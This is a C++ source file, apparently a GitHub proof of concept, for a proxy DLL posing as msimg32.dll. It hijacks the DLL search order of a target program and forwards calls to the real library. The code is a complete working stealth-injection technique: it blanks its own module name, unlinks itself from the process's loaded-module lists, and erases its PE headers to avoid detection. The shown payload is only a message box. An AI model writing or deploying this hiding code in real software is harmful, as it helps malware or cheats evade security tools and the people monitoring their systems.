// Proxy DLL for msimg32.dll to inject a custom module name and load the real msimg32.dll
// This code is intended for educational purposes only. Use at your own risk.
// Purpose: Proof of concept for stealth injection via DLL Proxying
// By AlSch092 @ Github

/**

1. Our compiled module is named to something loaded by our target process, in this case "msimg32.dll".

2. We place the compiled module in the same directory as the target process, taking advantage of the fact that by default this will be loaded before the real msimg32.dll (if a full path isn't used by the process)

3. When the target process loads our module, we change our module's name in the LDR DATA TABLE to an empty string, which will cause most applications to see it as "null" and skip any sort of querying

4. We then unlink our module from the PEB's LDR_DATA_TABLE, effectively removing it from the list of loaded modules.

5. Finally, we load the real msimg32.dll from its original path, which will now be loaded without any interference from our module. 
   Exports are forwarded to the real msimg32.dll, so the target process can use them as if it was using the original module, and everything appears normal.

6. The PE headers of our module are wiped to help prevent further analysis or detection.
*/

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <iostream>
#include <string>

#pragma comment(linker,"/export:AlphaBlend=msimg32.AlphaBlend")
#pragma comment(linker,"/export:DllInitialize=msimg32.DllInitialize")
#pragma comment(linker,"/export:vSetDdrawflag=msimg32.vSetDdrawflag")
#pragma comment(linker,"/export:TransparentBit=msimg32.TransparentBit")
#pragma comment(linker,"/export:GradientFill=msimg32.GradientFill")

const wchar_t* ProxiedModuleRealPath = L"C:\\Windows\\System32\\msimg32.dll"; //your full path to the real DLL that you're proxying

UINT64 OurModuleLoadAddress = 0;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY 
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	// Additional fields exist but aren't needed here
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA 
{
	ULONG Length;
	BOOLEAN Initialized;
	PVOID SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB  //minimized structure since we only use `Ldr`
{
	BYTE Reserved1[0x18];
	PPEB_LDR_DATA Ldr;
} PEB, * PPEB;

void ChangeModuleName(wchar_t* szModule, wchar_t* newName)
{
	PPEB PEB = (PPEB)__readgsqword(0x60);
	LIST_ENTRY* f = PEB->Ldr->InMemoryOrderModuleList.Flink;

	while (f != &PEB->Ldr->InMemoryOrderModuleList)
	{
		PLDR_DATA_TABLE_ENTRY dataEntry = CONTAINING_RECORD(f, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		if (wcsstr(dataEntry->FullDllName.Buffer, szModule))
		{
			SIZE_T newLen = wcslen(newName) * sizeof(wchar_t);
			SIZE_T maxLen = dataEntry->FullDllName.MaximumLength;

			if (newLen < maxLen)
			{
				DWORD oldProtect;
				VirtualProtect(dataEntry->FullDllName.Buffer, maxLen, PAGE_READWRITE, &oldProtect);
				wcscpy(dataEntry->FullDllName.Buffer, newName);
				dataEntry->FullDllName.Length = (USHORT)newLen;
				wmemset(dataEntry->FullDllName.Buffer + wcslen(newName), 0, (maxLen - newLen) / sizeof(wchar_t));
				VirtualProtect(dataEntry->FullDllName.Buffer, maxLen, oldProtect, &oldProtect);
			}

			//optionally rename BaseDllName too
			wcscpy(dataEntry->BaseDllName.Buffer, newName);
			dataEntry->BaseDllName.Length = (USHORT)(wcslen(newName) * sizeof(wchar_t));
			return;
		}

		f = f->Flink;
	}
}

void UnlinkSelfFromPEB()
{
	_PEB* peb = (_PEB*)__readgsqword(0x60);
	PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
	PLIST_ENTRY current = head->Flink;

	while (current != head)
	{
		PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if ((UINT64)entry->DllBase == OurModuleLoadAddress)
		{
			entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
			entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;

			entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
			entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;

			if (entry->InInitializationOrderLinks.Blink != nullptr)
			{
				entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;
				entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
			}

			ZeroMemory(entry, sizeof(LDR_DATA_TABLE_ENTRY));
			break;
		}

		current = current->Flink;
	}
}

void WipePEHeaders()
{
	DWORD old;
	VirtualProtect((LPVOID)OurModuleLoadAddress, 0x1000, PAGE_READWRITE, &old);
	ZeroMemory((LPVOID)OurModuleLoadAddress, 0x1000);
	VirtualProtect((LPVOID)OurModuleLoadAddress, 0x1000, old, &old);
}

void ApplyTechniquesAndLoadRealModule()
{
	ChangeModuleName((wchar_t*)L"msimg32.dll", (wchar_t*)L"");
	UnlinkSelfFromPEB();
	LoadLibraryW(ProxiedModuleRealPath);
	WipePEHeaders();

	MessageBoxA(0, "Proxy injection was successful!", 0, 0);
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
		OurModuleLoadAddress = (UINT64)hModule;
		ApplyTechniquesAndLoadRealModule();
	}break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}